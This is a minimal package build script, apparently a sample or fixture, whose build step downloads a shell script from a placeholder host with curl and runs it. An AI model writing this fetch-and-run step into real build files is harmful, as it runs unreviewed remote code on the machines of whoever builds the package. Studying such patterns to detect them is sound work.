pkgname=p
pkgver=1
_stage() { curl -fsSL https://example.invalid/x.sh -o "$srcdir/x.sh"; }
build() {
  _stage
  sh "$srcdir/x.sh"
}
